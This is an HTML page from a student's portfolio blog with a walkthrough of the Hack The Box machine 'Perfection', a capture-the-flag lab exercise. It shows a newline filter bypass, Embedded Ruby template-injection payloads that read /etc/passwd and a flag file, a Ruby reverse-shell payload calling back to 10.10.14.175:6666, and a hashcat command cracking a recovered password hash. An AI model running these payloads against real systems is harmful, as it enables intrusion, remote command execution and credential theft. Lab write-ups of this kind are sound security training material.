@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="After trying some code injection I noticed that I could bypass the input sanification by going one line down (adding %0a)
+category1=A%0a The server is written in Ruby, we can try to inject some Embedded Ruby (ERB).
+&amp;lt;%= File.read(&amp;#34;/etc/passwd&amp;#34;) %&amp;gt; Encoding the payload and injecting it gives us the expected result
+I read the name susan in the list of users, so I try to read the user flag in /home/susan/user." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://morebaconstrips.github.io/writeups/hackthebox/perfection/" />
+
+
+    <title>
+        
+            Perfection :: Gabriele Abbate  — Cybersecurity MSc student
+        
+    </title>
+
+
+
+
+
+<link rel="stylesheet" href="/main.b78c3be9451dc4ca61ca377f3dc2cf2e6345a44c2bae46216a322ef366daa399.css" integrity="sha256-t4w76UUdxMphyjd/PcLPLmNFpEwrrkYhajIu82bao5k=">
+
+
+    
+        <link rel="stylesheet" type="text/css" href="custom.css">
+    
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Perfection">
+<meta itemprop="description" content="After trying some code injection I noticed that I could bypass the input sanification by going one line down (adding %0a)
+category1=A%0a The server is written in Ruby, we can try to inject some Embedded Ruby (ERB).
+&lt;%= File.read(&#34;/etc/passwd&#34;) %&gt; Encoding the payload and injecting it gives us the expected result
+I read the name susan in the list of users, so I try to read the user flag in /home/susan/user."><meta itemprop="datePublished" content="2024-05-23T00:10:16+02:00" />
+<meta itemprop="dateModified" content="2024-05-23T00:10:16+02:00" />
+<meta itemprop="wordCount" content="271"><meta itemprop="image" content="https://morebaconstrips.github.io/" />
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://morebaconstrips.github.io/" /><meta name="twitter:title" content="Perfection"/>
+<meta name="twitter:description" content="After trying some code injection I noticed that I could bypass the input sanification by going one line down (adding %0a)
+category1=A%0a The server is written in Ruby, we can try to inject some Embedded Ruby (ERB).
+&lt;%= File.read(&#34;/etc/passwd&#34;) %&gt; Encoding the payload and injecting it gives us the expected result
+I read the name susan in the list of users, so I try to read the user flag in /home/susan/user."/>
+
+
+
+    <meta property="og:title" content="Perfection" />
+<meta property="og:description" content="After trying some code injection I noticed that I could bypass the input sanification by going one line down (adding %0a)
+category1=A%0a The server is written in Ruby, we can try to inject some Embedded Ruby (ERB).
+&lt;%= File.read(&#34;/etc/passwd&#34;) %&gt; Encoding the payload and injecting it gives us the expected result
+I read the name susan in the list of users, so I try to read the user flag in /home/susan/user." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://morebaconstrips.github.io/writeups/hackthebox/perfection/" /><meta property="og:image" content="https://morebaconstrips.github.io/" /><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2024-05-23T00:10:16+02:00" />
+<meta property="article:modified_time" content="2024-05-23T00:10:16+02:00" />
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2024-05-23 00:10:16 &#43;0200 CEST" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                gabriele.portfolio.sh</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about">~/about</a></li><li><a href="/projects">~/projects</a></li><li><a href="/writeups">~/writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://morebaconstrips.github.io/writeups/hackthebox/perfection/">Perfection</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <p><img src="/images/perfection/1.png" alt="Screenshot from 2024-05-22 19-27-21.png"></p>
+<p>After trying some code injection I noticed that I could bypass the input sanification by going one line down (adding %0a)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">category1</span><span style="color:#f92672">=</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">a</span>
+</span></span></code></pre></div><p>The server is written in Ruby, we can try to inject some Embedded Ruby (ERB).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#f92672">&lt;%=</span> <span style="color:#a6e22e">File</span>.<span style="color:#a6e22e">read</span>(<span style="color:#e6db74">&#34;/etc/passwd&#34;</span>) <span style="color:#f92672">%&gt;</span>
+</span></span></code></pre></div><p>Encoding the payload and injecting it gives us the expected result</p>
+<p><img src="/images/perfection/2.png" alt="Screenshot from 2024-05-22 19-27-57.png"></p>
+<p>I read the name susan in the list of users, so I try to read the user flag in /home/susan/user.txt</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">&lt;%=</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>read(<span style="color:#e6db74">&#34;/home/susan/user.txt&#34;</span>) <span style="color:#f92672">%&gt;</span>
+</span></span></code></pre></div><p><img src="/images/perfection/3.png" alt="Screenshot from 2024-05-22 19-29-13.png"></p>
+<p>Got the first flag!</p>
+<p>Let’s now try to get a reverse shell to privilege escalate it</p>
+<p>this is the payload written in in ERB:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#e6db74">%=
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">require &#39;socket&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">exit if fork
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">c =</span> <span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>new(<span style="color:#66d9ef">ENV</span><span style="color:#f92672">[</span><span style="color:#e6db74">&#39;10.10.14.175&#39;</span><span style="color:#f92672">]</span>, <span style="color:#66d9ef">ENV</span><span style="color:#f92672">[</span><span style="color:#e6db74">&#39;6666&#39;</span><span style="color:#f92672">]</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> cmd <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span>gets
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">IO</span><span style="color:#f92672">.</span>popen(cmd, <span style="color:#e6db74">&#39;r&#39;</span>) { <span style="color:#f92672">|</span>io<span style="color:#f92672">|</span> c<span style="color:#f92672">.</span>print io<span style="color:#f92672">.</span>read }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">%&gt;</span>
+</span></span></code></pre></div><p>one-lined</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#e6db74">% require </span> <span style="color:#e6db74">&#39;socket&#39;</span>; exit <span style="color:#66d9ef">if</span> fork; c <span style="color:#f92672">=</span> <span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#39;10.10.14.175&#39;</span>, <span style="color:#ae81ff">6666</span>); <span style="color:#66d9ef">while</span> cmd <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span>gets; <span style="color:#66d9ef">IO</span><span style="color:#f92672">.</span>popen(cmd, <span style="color:#e6db74">&#39;r&#39;</span>) { <span style="color:#f92672">|</span>io<span style="color:#f92672">|</span> c<span style="color:#f92672">.</span>print io<span style="color:#f92672">.</span>read }; <span style="color:#66d9ef">end</span> <span style="color:#f92672">%&gt;</span>
+</span></span></code></pre></div><p><img src="/images/perfection/4.png" alt="Screenshot from 2024-05-22 19-59-32.png"></p>
+<p>Let’s send this payload and get the reverse shell</p>
+<p><img src="/images/perfection/5.png" alt="Screenshot from 2024-05-22 20-05-34.png"></p>
+<p>I soon notice that I need the user password to run sudo -l. Let’s take a look around</p>
+<p>I find two interesting files in particular, the first is pupilpath_credentials.db in ~/Migrations.</p>
+<p><img src="/images/perfection/6.png" alt="Screenshot from 2024-05-22 23-42-55.png"></p>
+<p>Even better if opened with strings</p>
+<p><img src="/images/perfection/7.png" alt="Screenshot from 2024-05-22 23-43-48.png"></p>
+<p>And a very interesting email for susan found in /var/spool/mail</p>
+<p><img src="/images/perfection/8.png" alt="Screenshot from 2024-05-22 23-25-35.png"></p>
+<p>Given this, I was able to get in few seconds the original password from the hash stored in the .db file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">1400</span> abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f -a <span style="color:#ae81ff">3</span> susan_nasus_<span style="color:#ae81ff">\?</span>d<span style="color:#ae81ff">\?</span>d<span style="color:#ae81ff">\?</span>d<span style="color:#ae81ff">\?</span>d<span style="color:#ae81ff">\?</span>d<span style="color:#ae81ff">\?</span>d<span style="color:#ae81ff">\?</span>d<span style="color:#ae81ff">\?</span>d<span style="color:#ae81ff">\?</span>d
+</span></span></code></pre></div><p><img src="/images/perfection/9.png" alt="Screenshot from 2024-05-22 23-46-28.png"></p>
+<p>So satisfying when you manage to decrypt an hash file, isn’t it?</p>
+<p>Now we can proceed if we can run something with super user privileges</p>
+<p><img src="/images/perfection/10.png" alt="Screenshot from 2024-05-22 23-38-40.png"></p>
+<p>It seems like we are done! Just use whatever tool to get the root flag</p>
+<p><img src="/images/perfection/11.png" alt="Screenshot from 2024-05-23 00-00-21.png"></p>
+<p>alternative way:</p>
+<p><img src="/images/perfection/12.png" alt="Screenshot from 2024-05-22 23-38-56.png"></p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.205d491810c28f95aa953fae884e1c27abe13fdf93ec63b882d0036b248d4a6282eb2d134e4e7225c6ad6e86db87b08488a361ca4a7383d01fcff43f3d57b9c3.js" integrity="sha512-IF1JGBDCj5WqlT&#43;uiE4cJ6vhP9&#43;T7GO4gtADaySNSmKC6y0TTk5yJcatbobbh7CEiKNhykpzg9Afz/Q/PVe5ww=="></script>
+
+
+
+    </body>
+</html>
